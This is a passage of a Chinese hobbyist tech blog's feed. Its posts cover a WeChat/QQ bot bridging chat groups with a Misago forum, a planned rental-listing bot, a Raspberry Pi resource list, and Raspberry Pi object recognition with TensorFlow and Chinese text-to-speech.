&lt;p&gt;&lt;img alt="" src="https://raw.githubusercontent.com/wwj718/gif_bed/master/paperweekly_architecture.png" /&gt;&lt;/p&gt;
&lt;p&gt;我们先来看看从微信群发往论坛的消息。&lt;/p&gt;
&lt;p&gt;当微信群的讨论（成员的发言）匹配预先设定的模式时，将触发机器人特定行为，诸如往论坛发帖或回答问题。（这实际是CLI风格，如果你熟悉*nix，会觉得很亲切），所以机器人并没有处理自然语言，更多的是正则匹配，哈哈这有点小尴尬，如@张俊所言&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我们整天都在用机器学习，也都想通过人工智能来改变这个世界，来改变我们的生活，很多时候模型和工具都有，但缺少数据和需求，这次有了数据和需求，我们却无能为力了，感觉有一点点小讽刺&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;机器人士如何把消息发往论坛的呢。我hack了Misago（论坛所用的框架），使其对外提供RESTful API，允许使用http请求来做常见操作（发帖/回复之类）&lt;/p&gt;
&lt;p&gt;以发帖为例，我们跟着消息走，看到的是这样一个流程：微信群里某些消息匹配固定模式，机器人被激活，进而携带着token往论坛发送特定http请求，消息作为请求参数。于是消息从微信群流到了论坛&lt;/p&gt;
&lt;p&gt;接着我们来看看论坛发往微信群的消息。在论坛这块，我hack了源码里的发帖函数，使其具有webhook output功能，你很可能已经用过github的webhook output。当论坛产生帖子时，将对外发起一个web请求（output），外部系统收到请求便知道事件的发生，同时也能获取事件的细节（请求参数），如此一来这个钩子（hook）就把两个异构系统勾连起来。&lt;/p&gt;
&lt;p&gt;webhook是我偏好的异构系统间通信的解决方案，灵活性高，耦合度低。&lt;/p&gt;
&lt;p&gt;我将论坛的web请求发往一个消息服务（我选择kinto，至于原因我在开发文档里也有描述），而在机器人这边，会不断向消息服务轮询。这实际上是经典的发布/订阅模型（至于为何不采用redis和rabbitmq的原因我在开发文档里也有说明）。&lt;/p&gt;
&lt;p&gt;使用发布订阅模型考虑的主要是扩展性，我手头有nlp相关的 QQ群，当时觉得paperweekly的讨论内容很棒，也许其他nlp小组也会感兴趣，使用发布订阅模型，我只要在任何group里（QQ/wechat/telegram/whatapp）放上机器人，就可以订阅paperweekly的动态，我这边做了两个具体实现，其一是在微信群中订阅消息，源码见&lt;a href="https://github.com/wwj718/paperweekly_forum/blob/master/wechat_bot/paperweeklybot.py"&gt;paperweeklybot.py&lt;/a&gt;，其二是QQ群中订阅消息：源码见&lt;a href="https://github.com/wwj718/SmartQQBot"&gt;SmartQQBot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;至于论坛的选型（最终选择了Misago），大家在群里讨论的结果倾向选择基于python的论坛框架。因为大家对python更为熟悉，方便维护&lt;/p&gt;
&lt;h2&gt;群消息转发&lt;/h2&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/group2ca9e5a54.png" /&gt;&lt;/p&gt;
&lt;p&gt;关于这个需求的背景，引述@张俊的说明（&lt;a href="http://mp.weixin.qq.com/s?__biz=MzIwMTc4ODE0Mw==&amp;amp;mid=2247483940&amp;amp;idx=1&amp;amp;sn=554573482078e34e8909eeaa4030adec&amp;amp;chksm=96e9dda4a19e54b2f518759b214bd503c245991c40a3315a6daa3bb62aa7a455f54d62bdf050&amp;amp;scene=4#wechat_redirect"&gt;PaperWeekly十期总结&lt;/a&gt;）：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一个群很快就到了500人，出现了一个棘手的问题，第二个群的人如果太少，几乎没有讨论意义，所以就想用什么办法可以打通两个群，让两个群的童鞋在同一时空内进行交流&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;@碱馒头同学用了一个中午时间写了群消息转发机器人，我觉得很妙，功能干净利落、十分实用。后来我们觉得两个机器人可以合并成一个，本来计划由馒头兄来实现这块，后来因为我的微信机器人框架和馒头兄不同（我偏好&lt;a href="https://github.com/littlecodersh/ItChat"&gt;itchat&lt;/a&gt;），我就自己用itchat实现了这块&lt;/p&gt;
&lt;p&gt;这部分的实现比较简单，机器人同时在两个群里，当机器人接收到A群消息时，立马转发到B群。至于机器人如何得到群消息，就是微信机器人框架（itchat）做的事了，大家可以自行读文档&lt;/p&gt;
&lt;p&gt;目前只转发文本和表情，下一步准备支持图片/链接分享和跨群@&lt;/p&gt;
&lt;h2&gt;问题检索&lt;/h2&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/qa_bot2af8f456.png" /&gt;&lt;/p&gt;
&lt;p&gt;国庆去白洋淀玩，路上，@张俊同学提到一个有趣的想法：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;有人提问之后，能否直接从quora或者知乎检索相应的答案&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我想到之前玩过的一个叫做&lt;a href="https://github.com/gleitz/howdoi"&gt;howdoi&lt;/a&gt;的项目，于是以此为原型给bot添加了&lt;code&gt;问题检索&lt;/code&gt;的功能,源码见&lt;a href="https://github.com/wwj718/paperweekly_forum/blob/master/wechat_bot/qa_bot.py"&gt;qa_bot.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;目前用户可以在微信群向机器人提问，它会返回stackoverflow里最佳的答案&lt;/p&gt;
&lt;p&gt;原理很简单，howdoi的源码很短，大体思路是利用google的site特性，在指定的站点搜索问题（默认是stackoverflow），得到相关连接，然后打开连接，用pyquery提取内容，返回干净的答案给用户&lt;/p&gt;
&lt;p&gt;从howdoi的原理我们可以看出：实际上&lt;code&gt;问题搜索&lt;/code&gt;是利用了google强大的搜索能力，同时我们看到，这是一个易于扩展的框架，只要改变site对应的网址，理论上可以检索任何网址。最初的需求里提到的知乎和quora当然没有问题，剩下的工作只剩对答案做html清洗。惭愧的是我近来挖的坑太多，业余时间被分散在各个坑里，这个坑暂时还没填，等待小伙伴加入&lt;/p&gt;
&lt;p&gt;因为howdoi不支持中文（用中文从stackoverflow里基本搜不出有价值的东西），后来我们添加了一个翻译层，先做翻译，然后再检索，这样一来，就可以直接在微信群里用中文向机器人提问&lt;/p&gt;
&lt;p&gt;于是你就看到了上边一张图片里的问答&lt;/p&gt;
&lt;h1&gt;下一步&lt;/h1&gt;
&lt;p&gt;接下来除了填完上文提到的坑（todolist）&lt;/p&gt;
&lt;p&gt;还准备先把群消息存下，诸如（groupname，username，content，time），然后pandas做些简单统计，可做的事包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;添加一些小彩蛋，诸如@机器人可以返回该用户的历史参与情况&lt;/li&gt;
&lt;li&gt;统计得出年度热心群友（举个栗子：）,莫当真)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;进一步，可以用bokeh作可视化展示&lt;/p&gt;
&lt;p&gt;当然也可以把语料开放给群成员，供大家使用nlp来做一步的分析和挖掘，诸如挖出&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;近期焦点问题&lt;/li&gt;
&lt;li&gt;冷场话题排行版&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;或者用来训练一只paperweekly风格的机器人 ：）&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 05 Nov 2016 00:00:00 +0000</pubDate><guid>tag:,2016-11-05:paperweekly-forum-bot.html</guid><category>code</category></item><item><title>写一个租房机器人</title><link>/apartment-finding-bot.html</link><description>&lt;p&gt;房子下月到期，近期在关注找合适房源，靠谱室友，今晚回来花了一个多小时在豆瓣看租房帖子。&lt;/p&gt;
&lt;p&gt;深感效率之低：打开&lt;a href="https://www.douban.com/group/zf365"&gt;南京租房豆瓣&lt;/a&gt;，逐个点开帖子，首先排除非个人发布信息，留下的帖子里，排除仅限女生合租的，排除已租的，排除价格过低不靠谱的，然后开始综合评估：照片/地段/价格，有些帖子只给小区不给位置的，还得百度地图查下小区所在位置&lt;/p&gt;
&lt;p&gt;这个工作很适合让机器人（bot）来做，找房源这件事至少有一半的工作是可以自动化的，用上简单的爬虫和正则可以过滤大量的无效信息，如果加上自然语言处理（nlp）几乎可以完成大多的内容提取&lt;/p&gt;
&lt;p&gt;之后再加上bokeh来做交互式数据展示，自然语言处理完，我们可以得到一些关键信息，命名实体（微信号、价格、地段、图片、评论数），然后把它们结构化，让用户与数据可视化地交互（实际是使用pandas来筛选数据），基于我之前的这个工作：&lt;a href="http://blog.just4fun.site/a-generic-Subscription-Services.html"&gt;一种通用的可视化订阅服务&lt;/a&gt;，很容易按照某个指标筛选出合适的房源&lt;/p&gt;
&lt;p&gt;前端时间有篇文章很火：&lt;a href="http://www.codingpy.com/article/apartment-finding-slackbot/?utm_source=tuicool&amp;amp;utm_medium=referral"&gt;硅谷码农用Python写了个机器人，租到了让女友满意的房子&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这篇文章写得很漂亮，受租房困扰，本着DRY原则，一个问题只解决一次，我想解决方案把工具分享出来，让别人解决同样的问题。&lt;/p&gt;
&lt;p&gt;决定挖坑写个租房机器人和可视化筛选工具&lt;/p&gt;
&lt;h1&gt;先挖坑 待填&lt;/h1&gt;
&lt;p&gt;先给个大纲&lt;/p&gt;
&lt;h1&gt;爬虫部分&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;scrapy/pyspider&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;信息提取&lt;/h1&gt;
&lt;h3&gt;清洗数据&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;html -&amp;gt; txt&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;自然语言处理&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;命名实体识别&lt;/li&gt;
&lt;li&gt;取出地段&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;数据检索/可视化&lt;/h1&gt;
&lt;p&gt;bokeh/pandas&lt;/p&gt;
&lt;p&gt;根据字段筛选：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;价格区间&lt;/li&gt;
&lt;li&gt;开关（是否地铁站附近/阳台）&lt;/li&gt;
&lt;li&gt;整租/主卧/次卧&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;图片悬停/帖子超链/地图展示&lt;/p&gt;
&lt;h1&gt;why&lt;/h1&gt;
&lt;p&gt;比运行租房机器人让它找房更省力的是，写一篇文章，让同在找房子的你看到，等你说：hi，我也是技术发烧友，寻一个志趣相投的室友，周末还可以一起写个好玩的bot~&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/soulteary/tenant-point"&gt;tenant-point&lt;/a&gt;：租房要点，适用于北上广深杭，欢迎补充&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/zhangxiaoyang/zufang"&gt;zufang&lt;/a&gt;：豆瓣租房搜索引擎&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.codingpy.com/article/apartment-finding-slackbot/?utm_source=tuicool&amp;amp;utm_medium=referral"&gt;硅谷码农用Python写了个机器人，租到了让女友满意的房子&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 01 Nov 2016 00:00:00 +0000</pubDate><guid>tag:,2016-11-01:apartment-finding-bot.html</guid><category>data</category></item><item><title>周末、填坑与树莓派资源大全</title><link>/awesome-raspberry-pi-zh.html</link><description>&lt;h3&gt;周末&lt;/h3&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/pi_lmdc5109614.png" /&gt;&lt;/p&gt;
&lt;p&gt;难得的晴天，午睡足，醒来快三点，下午骑车闲逛，到老门东，一路骑来，风光满眼&lt;/p&gt;
&lt;p&gt;途闻桂香，想到-dumb-在《秋望》里写到&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;桂子天香渐满廊&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;翻出原句，再读，依然觉得大好：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;前調
    秋望
老去身閑與世忘。罷裁矮紙倚昏黃。孤光一出千山暗，小立人間萬木涼。  新涕淚，古蒼茫。片時相對已恩長。秋風葉上清商起，桂子天香漸滿廊。
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;填坑&lt;/h3&gt;
&lt;p&gt;到老门东星巴克，选了个二楼靠窗位置,可见斜檐、屋顶、明城墙&lt;/p&gt;
&lt;p&gt;准备坐上半天，来填近来挖的坑&lt;/p&gt;
&lt;p&gt;先把完整填完的坑，放上来&lt;/p&gt;
&lt;h3&gt;树莓派资源大全&lt;/h3&gt;
&lt;p&gt;近来折腾了几个好玩的东西，与树莓派有关，也陆续写了几篇文章，收到不少邮件，大家还蛮喜欢的。开心&lt;/p&gt;
&lt;p&gt;折腾树莓派过程中看到不少国内外好玩的项目，我喜欢收集整理有趣的东西，也喜欢归档到博客和github。&lt;/p&gt;
&lt;p&gt;前端时间看到国外有人整理了&lt;a href="https://github.com/thibmaek/awesome-raspberry-pi"&gt;awesome-raspberry-pi&lt;/a&gt;，决定翻译为中文。之后我还打算在树莓派上折腾图形化编程、ai和自动驾驶之类的东西，会长期和树莓派打交道，所以将长期维护这个树莓派资源列表&lt;/p&gt;
&lt;p&gt;如果你用树莓派做了什么好玩的东西，并且愿意分享出来，欢迎把你的项目加入到资源列表里 ：）&lt;/p&gt;
&lt;p&gt;具体的资源大全戳这里：&lt;a href="https://github.com/wwj718/awesome-raspberry-pi-zh"&gt;wwj718/awesome-raspberry-pi-zh&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;期待你的PR : )&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 30 Oct 2016 00:00:00 +0000</pubDate><guid>tag:,2016-10-30:awesome-raspberry-pi-zh.html</guid><category>tools</category></item><item><title>基于树莓派和Tensowflow的物体识别-speaker</title><link>/raspberrypi-tensowflow-robot-speaker.html</link><description>&lt;p&gt;接上篇文章:&lt;a href="http://blog.just4fun.site/raspberrypi-tensowflow-robot.html"&gt;基于树莓派和Tensowflow的物体识别-brain&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上篇文章里我们用tensorflow的inception模型为&lt;code&gt;树莓派探险者&lt;/code&gt;添加智能（它的大脑（brain））。这篇文章里我们给他添加外设，使其"说"出物体的名称，我们将使其成为speaker&lt;/p&gt;
&lt;p&gt;ps：之所以叫树莓派探险者是它的行为很像一个初入地球的外星机器人，对周遭事物充满好奇，试图弄清看到的每个物体是什么（代码的实现是超声波测距+拍照+tensorflow图像识别）&lt;/p&gt;
&lt;h1&gt;目标&lt;/h1&gt;
&lt;p&gt;我们将使树莓派探险者用中文说出看到的物体的名字，诸如&lt;code&gt;这是一个橘子&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;任务&lt;/h1&gt;
&lt;p&gt;为了实现这个目标我们有几件事要做。&lt;/p&gt;
&lt;p&gt;tensorflow的inception模型识别完物体，将输出5个最为贴近的物体的英文名称。我们选取得分最高的物体，将其名称翻译为中文，之后用蓝牙音箱输出：&lt;code&gt;这是一个xxx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;实际上是以下两项任务：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;英汉翻译&lt;/li&gt;
&lt;li&gt;中文文字转语音&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;解决方案&lt;/h1&gt;
&lt;p&gt;完成以上任务，有两种典型的方案，一种使用云服务，一种使用本地软件&lt;/p&gt;
&lt;h3&gt;云服务&lt;/h3&gt;
&lt;p&gt;使用云服务，我们可以轻松完成以上两项任务，英汉翻译使用：&lt;a href="https://github.com/translate/translate"&gt;translate&lt;/a&gt;, 这是一个python库，直接pip安装就行&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# pip install translate&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;translate&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Translator&lt;/span&gt;
&lt;span class="n"&gt;translator&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Translator&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;from_lang&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;en&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;to_lang&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;zh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;translation&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;translator&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;translate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;umbrella&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;translation&lt;/span&gt; &lt;span class="c1"&gt;#雨伞&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;p&gt;中文文字转语音可以使用&lt;a href="http://yuyin.baidu.com/tts/"&gt;百度语音合成&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;本地软件&lt;/h3&gt;
&lt;p&gt;为了提高响应速度和可控性，使其减少对网络的依赖（有些环境并没有网络），也许我们更倾向使用本地软件&lt;/p&gt;
&lt;p&gt;下面分别论述如何在不依赖网络的情况下使用本地软件来完成翻译和文字转语音的任务&lt;/p&gt;
&lt;p&gt;英汉翻译我们选择: &lt;code&gt;sdcv&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo  apt-get install sdcv
mkdir -p ~/.stardict/dic # 之后把字典下载解压到这个目录里
sdcv orange #查询单词 orange
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后我们用正则提取出其中的名词选项，选择最靠前的（这个策略没有认真考虑过）&lt;/p&gt;
&lt;p&gt;至于字典的下载可以到这里：&lt;a href="http://abloz.com/huzheng/stardict-dic/zh_CN/"&gt;zh_CN 简体中文词典&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我下了三个字典：朗道英汉字典5.0、KDic11万英汉词典、牛津简明英汉袖珍辞典&lt;/p&gt;
&lt;p&gt;朗道英汉字典5.0内容详尽，牛津简明英汉袖珍辞典简单清晰&lt;/p&gt;
&lt;p&gt;我偏好后者&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;下一个任务是中文文字转语音，树莓派机器人原作者Lukas使用&lt;a href="http://www.festvox.org/flite/"&gt;Flite&lt;/a&gt;来做文字转语音。Flite是一个小型、快速的TTS系统，是著名的语音合成系统festival的C版本，可用于嵌入式系统&lt;/p&gt;
&lt;p&gt;可惜这个工具不支持中文，我决定采用:&lt;a href="https://github.com/hgneng/ekho"&gt;ekho&lt;/a&gt;来做文字转语音的工作，项目介绍在:&lt;a href="http://www.eguidedog.net/cn/ekho_cn.php"&gt;Ekho(余音) - 中文语音合成软件&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其他可选的工具还有eSpeak,安装和使用都简单。&lt;code&gt;espeak -vzh "你好"&lt;/code&gt;，发音比较机械&lt;/p&gt;
&lt;h1&gt;todo&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;增加看图说话功能（Show and Tell: image captioning open sourced in TensorFlow）&lt;/li&gt;
&lt;li&gt;语音识别（pocketsphinx）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/zouxy09/article/details/7942784"&gt;PocketSphinx语音识别系统的编译、安装和使用&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jlinux/blog/blob/master/posts/voice-control.md"&gt;voice-control&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 25 Oct 2016 00:00:00 +0000</pubDate><guid>tag:,2016-10-25:raspberrypi-tensowflow-robot-speaker.html</guid><category>tools</category></item><item><title>基于树莓派和Tensowflow的物体识别-brain</title><link>/raspberrypi-tensowflow-robot.html</link><description>&lt;p&gt;近来这篇文章很火：&lt;a href="https://www.oreilly.com/learning/how-to-build-a-robot-that-sees-with-100-and-tensorflow"&gt;How to build a robot that “sees” with $100 and TensorFlow&lt;/a&gt; （作者是Lukas，CrowdFlower创始人）
，中文译本为《如何用100美金和Tensowflow来造一个能"看"东西的机器人》，公众号们纷纷转载&lt;/p&gt;
&lt;p&gt;文章读来饶有趣味，里边涉及的技术大多接触过，都不难，遂决定动手实现它&lt;/p&gt;
&lt;p&gt;要实现整个项目，我手头还缺小车底盘，我们先来实现这个项目的核心部分：用树莓派和Tensowflow的识别现实世界的物体。日后有空再加上小车&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/orange94aa0771.png" /&gt;&lt;/p&gt;
&lt;p&gt;随手把桌子上同事给的橘子拍下来，之后我们试着让树莓派认出它&lt;/p&gt;
&lt;h1&gt;任务描述&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://www.oreilly.com/learning/how-to-build-a-robot-that-sees-with-100-and-tensorflow"&gt;How to build a robot that “sees” with $100 and TensorFlow&lt;/a&gt; 已经把要做的是事说清楚了&lt;/p&gt;
&lt;p&gt;物体识别是近来机器学习领域的热点之一。对于识别人脸或是区分猫狗这件事上，计算机已经胸有成竹，而在更大的图片集中识别一个指定的物体还是人工智能领域的“圣杯”，不过近年也有很大进展&lt;/p&gt;
&lt;p&gt;我们将造一个能自己识别物体的机器人（不需要云服务）&lt;/p&gt;
&lt;h1&gt;工具介绍&lt;/h1&gt;
&lt;h3&gt;树莓派&lt;/h3&gt;
&lt;p&gt;树莓派（Raspberry Pi）是一款基于Linux的单板机电脑，它只有巴掌大小，却有惊人的计算能力，你可以把它当做一台普通电脑。&lt;/p&gt;
&lt;p&gt;树莓派的使命是制作一套启发孩子的电脑，降低孩子们试错的成本&lt;/p&gt;
&lt;p&gt;树莓派最新的版本是树莓派3,较前一代树莓派2，树莓派3的处理器升级为了64位的博通BCM2837，并首次加入了Wi-Fi无线网络及蓝牙功能。加量不加价&lt;/p&gt;
&lt;h3&gt;TensorFlow&lt;/h3&gt;
&lt;p&gt;TensorFlow是一个由"Google大脑"团队的研究人员开发的机器学习库，Google遵循Apache License 2.0将其开源。该系统可以被用于语音识别、图片识别等多个领域&lt;/p&gt;
&lt;p&gt;在这个项目中我们主要用到一个叫做&lt;a href="https://github.com/tensorflow/models/tree/master/inception"&gt;inception&lt;/a&gt;的模型（基于ImageNet数据集）。它可以完成物体识别，我们直接使用预训练好的模型。训练模型可是个费时费力的工作&lt;/p&gt;
&lt;p&gt;你把智能当黑盒使用的时候，并不需要有那么多偷懒的负罪感啦（哈哈  我还是有一点）&lt;/p&gt;
&lt;p&gt;电气时代来临的时候，变革社会的除了那些发电的人，那些懂得使用电力去改造传统行业，创造新的行业的人，也许对社会的变革更为深刻。尽管他们可能连卡诺循环都不知道，甚至不知如何将水蒸汽中的动能转换为功，进而驱动电机发电&lt;/p&gt;
&lt;h4&gt;ImageNet数据集&lt;/h4&gt;
&lt;p&gt;这个数据集包含约120万张训练图像、5万张验证图像和10万张测试图像，分为1000个不同的类别，用于机器学习中训练图像识别系统&lt;/p&gt;
&lt;h1&gt;准备工作&lt;/h1&gt;
&lt;p&gt;我们先准备好树莓派,我用的是安装了&lt;a href="https://downloads.raspberrypi.org/raspbian/images/raspbian-2016-05-31/"&gt;raspbian-2016-05-31&lt;/a&gt;版本的树莓派3代（使用其他版本应该也没问题），关于树莓派的相关配置可以参考我之前的文章：&lt;a href="http://blog.just4fun.site/raspberrypi-install-and-config.html"&gt;树莓派折腾笔记之系统安装与配置&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;安装Tensowflow&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://www.oreilly.com/learning/how-to-build-a-robot-that-sees-with-100-and-tensorflow"&gt;How to build a robot that “sees” with $100 and TensorFlow&lt;/a&gt; 这篇文章里，作者采用的是TensorFlow提供的makefile命令，在树莓派中本地编译，这一步骤花费了作者几个小时。不过好处是一步到位。安装完后可以直接运行：&lt;code&gt;tensorflow/contrib/pi_examples/label_image/gen/bin/label_image&lt;/code&gt;来识别物体&lt;/p&gt;
&lt;p&gt;我不打算编译安装，除了过程费事，还需要在安装的几个小时里提心吊胆，深怕某个依赖问题导致前功尽弃，重新编译。 我在手动编译opencv的时候就曾备受折磨&lt;/p&gt;
&lt;h3&gt;我的安装过程&lt;/h3&gt;
&lt;p&gt;我们先安装已经适合树莓派的Tensowflow，这种工作，肯定有人做过，github一搜果不其然：&lt;a href="https://github.com/samjabrahams/tensorflow-on-raspberry-pi"&gt;tensorflow-on-raspberry-pi&lt;/a&gt;。我们开始安装：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wget https://github.com/samjabrahams/tensorflow-on-raspberry-pi/raw/master/bin/tensorflow-0.9.0-cp27-none-linux_armv7l.whl
sudo pip install tensorflow-0.9.0-cp27-none-linux_armv7l.whl  #这一步会安装其他依赖，如果太慢，可以用-i参数，使用豆瓣源
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;安装过程很快，也就喝杯茶时间，过程十分流畅&lt;/p&gt;
&lt;p&gt;Tensowflow安装完成，我们开始加载模型,安装过程参考这里:&lt;a href="https://github.com/tensorflow/tensorflow/tree/master/tensorflow/contrib/pi_examples"&gt;pi_examples&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mkdir  ~/tf
cd /usr/local/lib/python2.7/dist-packages/tensorflow/models/image/imagenet
python classify_image.py --model_dir ~/tf/imagenet #--model_dir 指定模型数据存放的目录
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;完成后我们来测试下是否正常&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python /usr/local/lib/python2.7/dist-packages/tensorflow/models/image/imagenet/classify_image.py  --model_dir ~/tf/imagenet
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果是如下输出则一切就绪：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;giant panda, panda, panda bear, coon bear, Ailuropoda melanoleuca (score = 0.89233)
indri, indris, Indri indri, Indri brevicaudatus (score = 0.00859)
lesser panda, red panda, panda, bear cat, cat bear, Ailurus fulgens (score = 0.00264)
custard apple (score = 0.00141)
earthstar (score = 0.00107)
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;测试&lt;/h3&gt;
&lt;p&gt;我们来试一下我的伞（拍于办公室）：&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/sandfa6b51c.png" /&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python /usr/local/lib/python2.7/dist-packages/tensorflow/models/image/imagenet/classify_image.py  --model_dir ~/tf/imagenet --image_file /tmp/test.jpg  # 图片需是jpg格式
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;输出为&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/san47120afa.png" /&gt;&lt;/p&gt;
&lt;p&gt;程序会给出5个可能的物体，得分最高的是雨伞，识别的很准确&lt;/p&gt;
&lt;p&gt;我们接着给它看一张橘子的图片：&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/orange94aa0771.png" /&gt;&lt;/p&gt;
&lt;p&gt;输出为&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;lemon (score = 0.72036)
orange (score = 0.16516)
spaghetti squash (score = 0.01571)
butternut squash (score = 0.00304)
ocarina, sweet potato (score = 0.00298)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;它认为最大的可能是柠檬，橘子和柠檬确实很相似&lt;/p&gt;
&lt;p&gt;如果你想自己来训练你的模型，可以参考googleblog上的这篇文章:&lt;a href="https://research.googleblog.com/2016/03/train-your-own-image-classifier-with.html"&gt;Train your own image classifier with Inception in TensorFlow&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;优化&lt;/h1&gt;
&lt;p&gt;目前物体识别的性能不高，需要等一会儿，Lukas的机器人很有趣，它每次拍下照片，开始计算的时候会说&lt;code&gt;I'm thinking&lt;/code&gt;。延时得很自然，机器也确实是在“思考”&lt;/p&gt;
&lt;p&gt;关于如何提高运算速度，以下是几个可能&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用GPU来计算。树莓派支持GPU运算，不过&lt;a href="https://github.com/samjabrahams/tensorflow-on-raspberry-pi"&gt;tensorflow-on-raspberry-pi&lt;/a&gt;目前没有GPU版本的whl，linux/mac都有GPU版本的whl. 此问题详细谈论可以参考:&lt;a href="https://github.com/samjabrahams/tensorflow-on-raspberry-pi/issues/15"&gt;Question on GPU&lt;/a&gt;&lt;/li&gt;
